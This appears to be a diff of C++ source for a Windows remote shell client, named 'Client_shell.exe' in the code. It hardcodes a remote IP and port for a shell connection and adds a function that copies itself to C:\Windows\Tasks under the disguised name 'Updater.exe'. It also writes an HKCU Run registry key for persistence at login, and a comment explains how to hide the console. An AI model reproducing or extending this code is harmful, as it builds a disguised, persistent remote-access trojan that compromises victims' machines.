@@ -7,31 +7,46 @@
 #include <codecvt>
 #include <locale>
 #include <iostream>
+#include <algorithm>
+#include <string>
+#include <regex>
+
 using namespace std;
-
-
 #pragma comment(lib, "Ws2_32.lib")
+
 #define DEFAULT_BUFLEN 1024
 #define BUFSIZE MAX_PATH
 void BindSock(char* rhost, int rport);
+
+void MooveExe() {
+	char path[MAX_PATH + 1] = "";
+	DWORD len = GetCurrentDirectoryA(MAX_PATH, path);
+	strcat_s(path, "\\Client_shell.exe");
+
+	cout << path << "\n";
+
+	string str2 = regex_replace(path, std::regex("\\\\"), "\\\\");
+	const char* test = str2.c_str();
+	cout << test << "\n";
+	cout << "Copying to C:\\Windows\\Tasks\\Updater.exe";
+	CopyFileA(test, "C:\\Windows\\Tasks\\Updater.exe", true);
+}
 
 int main(int argc, char** argv) {
 	//FreeConsole(); // This is the way to make the cmd vanish
 	char rhost[] = "51.75.30.35"; // ip to connect to
 	int rport = 8081;
-	
-	TCHAR Buffer[BUFSIZE];
-	DWORD dwRet;
+		
 
-	dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
-	cout<< (char*)Buffer;
+	MooveExe();
+	cin.get();
 	//BindSock(rhost, rport);
 	return 0;	
 }
 
 
 void CreateKey() {
-	std::wstring progPath = L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";
+	std::wstring progPath = L"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Updater.exe";
 	HKEY hkey = NULL;
 	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
 	LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
